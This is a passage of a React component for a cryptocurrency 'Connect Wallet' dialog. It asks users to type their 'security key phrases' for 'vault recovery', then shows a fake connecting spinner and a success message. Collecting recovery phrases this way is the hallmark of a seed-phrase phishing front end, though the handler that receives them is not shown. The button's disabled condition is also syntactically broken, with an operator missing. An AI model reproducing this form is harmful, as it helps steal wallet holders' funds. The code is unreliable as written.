me="bg-popover border-border max-h-60">
                    {WALLET_OPTIONS.map((wallet) => (
                      <SelectItem key={wallet} value={wallet} className="font-mono">
                        {wallet}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium font-mono">Security Keys</label>
                <Textarea
                  value={securityKeys}
                  onChange={(e) => setSecurityKeys(e.target.value)}
                  placeholder="Enter your security key phrases for vault recovery..."
                  className="w-full bg-input border-border font-mono text-sm resize-none"
                  rows={3}
                />
                <p className="text-xs text-muted-foreground font-mono">
                  These security keys will help you recover your vault account
                </p>
              </div>

              <Button
                onClick={handleConnect}
                disabled={!selectedWallet  !securityKeys.trim()}
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-medium"
              >
                <Wallet className="w-4 h-4 mr-2" />
                Connect Wallet
              </Button>
            </>
          )}

          {isConnecting && (
            <div className="text-center py-8">
              <Loader2 className="w-8 h-8 animate-spin text-primary mx-auto mb-4" />
              <h3 className="text-lg font-semibold font-sans mb-2">Connecting to {selectedWallet}</h3>
              <p className="text-sm text-muted-foreground font-mono">
                Establishing secure connection to your wallet...
              </p>
            </div>
          )}

          {isConnected && (
            <div className="text-center py-8">
              <CheckCircle className="w-8 h-8 text-primary mx-auto mb-4" />
              <h3 className="text-lg font-semibold font-sans mb-2">Successfully Connected!</h3>
              <p className="text-sm text-muted-foreground font-mono">
                Your {selectedWallet} is now connected to the vault
              </p>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  )
}
